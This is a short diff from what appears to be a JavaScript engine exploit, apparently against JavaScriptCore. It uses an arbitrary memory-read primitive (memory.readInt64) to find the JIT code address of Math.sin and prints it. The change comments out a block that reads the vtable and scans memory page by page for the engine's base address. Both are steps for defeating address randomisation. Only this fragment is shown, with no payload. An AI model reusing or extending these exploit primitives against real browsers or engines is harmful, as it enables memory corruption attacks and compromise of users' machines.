@@ -641,7 +641,7 @@ for (var i = 0; i < 1000; ++i) {
         var jitCodeAddr = memory.readInt64(Add(executableAddr,24));
 	print("Math.sin() jitCodeAddr @ " + jitCodeAddr);
         
-        var vtab = memory.readInt64(jitCodeAddr);
+        /*var vtab = memory.readInt64(jitCodeAddr);
         print("Math.sin() vtable @ " + vtab)
         var anchor1 = memory.readInt64(vtab)
         print("anchor1" + anchor1);
@@ -656,7 +656,7 @@ for (var i = 0; i < 1000; ++i) {
             break;
         }
         jsc = Sub(jsc, 0x1000);
-        }
+        }*/
 	      
 	
 
